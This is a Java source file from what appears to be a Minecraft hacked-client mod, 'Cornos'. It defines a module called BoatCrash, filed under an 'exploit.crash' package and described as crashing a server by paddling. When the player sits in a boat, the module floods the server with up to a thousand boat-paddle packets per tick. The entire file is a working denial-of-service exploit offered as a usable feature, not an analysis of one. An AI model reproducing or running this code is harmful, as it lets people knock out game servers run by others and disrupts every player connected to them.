/*
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
# Project: Cornos
# File: BoatCrash
# Created by constantin at 14:30, MÃ¤r 13 2021
PLEASE READ THE COPYRIGHT NOTICE IN THE PROJECT ROOT, IF EXISTENT
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
*/
package me.zeroX150.cornos.features.module.impl.exploit.crash;

import java.util.Objects;

import me.zeroX150.cornos.Cornos;
import me.zeroX150.cornos.etc.config.MConfNum;
import me.zeroX150.cornos.etc.helper.STL;
import me.zeroX150.cornos.features.module.Module;
import me.zeroX150.cornos.features.module.ModuleType;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;

public class BoatCrash extends Module {
	MConfNum amount = new MConfNum("amount", 100, 1000, 1);

	public BoatCrash() {
		super("BoatCrash", "crashes a server by paddling", ModuleType.CRASH);
		this.mconf.add(amount);
	}

	@Override
	public void onEnable() {
		super.onEnable();
	}

	@Override
	public void onExecute() {
		assert Cornos.minecraft.player != null;
		Entity e = Cornos.minecraft.player.getVehicle();
		if (!(e instanceof BoatEntity)) {
			STL.notifyUser("You gotta be in a boat smh");
			this.setEnabled(false);
			return;
		}
		for (int i = 0; i < amount.getValue(); i++) {
			BoatPaddleStateC2SPacket p = new BoatPaddleStateC2SPacket(true, true);
			Objects.requireNonNull(Cornos.minecraft.getNetworkHandler()).sendPacket(p);
		}
		super.onExecute();
	}
}
